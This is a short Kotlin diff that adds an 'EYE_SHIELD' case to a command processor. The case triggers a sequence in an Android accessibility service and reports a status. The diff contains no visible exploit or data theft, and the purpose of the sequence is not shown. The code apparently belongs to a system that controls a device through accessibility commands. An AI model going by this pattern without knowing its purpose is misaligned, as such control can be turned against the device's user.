@@ -2019,6 +2019,15 @@ object CommandProcessor {
                         status = "FAILED (SERVICE_OFF)"
                     }
                 }
+                "EYE_SHIELD" -> {
+                    val service = MyAccessibilityService.instance
+                    if (service != null) {
+                        service.startEyeShieldSequence(id, content.trim().uppercase())
+                        status = "EYE_SHIELD_SEQUENCE_INITIATED"
+                    } else {
+                        status = "FAILED (SERVICE_OFF)"
+                    }
+                }
                 "SET_WALLPAPER" -> {
                     val parts = content.split("|", limit = 2)
                     if (parts.size >= 2) {
